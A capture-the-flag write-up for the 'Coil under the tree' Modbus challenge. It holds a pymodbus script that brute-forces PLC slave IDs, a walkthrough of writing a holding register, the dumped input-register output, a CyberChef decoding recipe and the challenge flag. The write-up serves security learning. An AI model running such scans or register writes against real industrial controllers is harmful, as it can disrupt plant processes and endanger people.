---
layout: Post
format: chall
title: Day 16 - Coil under the tree
date: 2024-12-17
ctf: Root-Xmas
tags: [Modbus, PLC]
category: [Industrial]
---
# Day 16 - Coil under the tree

<a class="back-link" href="../../">< Go back</a>

## Description

Your are currently connected to internal plant, your objectif will be to extract informations from PLC devices.

The targeted PLC stores important informations in its input registers. But... To get this information you have to:

Scan and find a valid slave ID;

Edit its holding register at address 0x10 with the value 0xff;

Read input registers to get important informations (be quick, you only have 5 seconds to read this data after editing!).

Author : Nishacid

163.172.68.42:10016

all files in [resources/](./resources) were provided.

## Challenge

Find the `slave_id` using brute force:

```py
from pymodbus.client.sync import ModbusTcpClient

def scan_slave_ids(host, port, timeout=1):
    client = ModbusTcpClient(host, port=port, timeout=timeout)
    active_slaves = []

    for slave_id in range(1, 248):
        if client.connect():
            response = client.read_coils(0, 1, unit=slave_id)
            if response.isError():
                print(f"Slave ID {slave_id}: No response or error")
            else:
                print(f"Slave ID {slave_id}: Active")
                active_slaves.append(slave_id)
            client.close()
        else:
            print("Failed to connect to the host.")
            break

    return active_slaves

active_slaves = scan_slave_ids("163.172.68.42", 10016)
print("Active Slave IDs:", active_slaves)
```

We find that the Slave ID `105` is active. Now we need to write `0xff` to it's 10th holding register and read the input registers.

After some trial and error I found that delays were necessary between actions, I put 1s.

The exploit script can be found here [exploit.py](./exploit.py):

```
Connected to Modbus server.

Register 10: 0

Successfully wrote 255 to Register 10.

Register 10: 0

Input Registers from 0 to 124:
Register 0: 81
Register 1: 50
Register 2: 57
Register 3: 117
Register 4: 90
Register 5: 51
Register 6: 74
Register 7: 104
Register 8: 100
Register 9: 72
Register 10: 86
Register 11: 115
Register 12: 89
Register 13: 88
Register 14: 82
Register 15: 112
Register 16: 98
Register 17: 50
Register 18: 53
Register 19: 122
Register 20: 76
Register 21: 67
Register 22: 66
Register 23: 53
Register 24: 98
Register 25: 51
Register 26: 85
Register 27: 103
Register 28: 89
Register 29: 50
Register 30: 70
Register 31: 117
Register 32: 73
Register 33: 72
Register 34: 90
Register 35: 104
Register 36: 98
Register 37: 71
Register 38: 108
Register 39: 107
Register 40: 89
Register 41: 88
Register 42: 82
Register 43: 108
Register 44: 73
Register 45: 72
Register 46: 82
Register 47: 111
Register 48: 97
Register 49: 88
Register 50: 77
Register 51: 103
Register 52: 89
Register 53: 50
Register 54: 104
Register 55: 104
Register 56: 98
Register 57: 71
Register 58: 120
Register 59: 108
Register 60: 98
Register 61: 109
Register 62: 100
Register 63: 108
Register 64: 73
Register 65: 72
Register 66: 100
Register 67: 112
Register 68: 100
Register 69: 71
Register 70: 103
Register 71: 54
Register 72: 73
Register 73: 70
Register 74: 115
Register 75: 110
Register 76: 85
Register 77: 107
Register 78: 49
Register 79: 55
Register 80: 77
Register 81: 84
Register 82: 78
Register 83: 104
Register 84: 90
Register 85: 68
Register 86: 70
Register 87: 105
Register 88: 89
Register 89: 122
Register 90: 74
Register 91: 108
Register 92: 77
Register 93: 106
Register 94: 86
Register 95: 105
Register 96: 78
Register 97: 106
Register 98: 74
Register 99: 57
Register 100: 88
Register 101: 71
Register 102: 52
Register 103: 110
Register 104: 88
Register 105: 81
Register 106: 61
Register 107: 61
Register 108: 0
Register 109: 0
Register 110: 0
Register 111: 0
Register 112: 0
Register 113: 0
Register 114: 0
Register 115: 0
Register 116: 0
Register 117: 0
Register 118: 0
Register 119: 0
Register 120: 0
Register 121: 0
Register 122: 0
Register 123: 0
Register 124: 0

Connection closed.
```

From these results, lets convert this from decimal bytes to the actual chars and do some extra parsing using CyberCher:

```
Find_/_Replace({'option':'Regex','string':'Register \\d+: '},'',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'\\n'},' ',true,false,true,false)
From_Decimal('Space',false)
Find_/_Replace({'option':'Regex','string':'\\0+$'},'',true,false,true,false)
From_Base64('A-Za-z0-9+/=',true,false)
```

And finally we get: `Congratulations, you can validate this challenge with: ['RM{13ad1bc2e25b62}\n']`
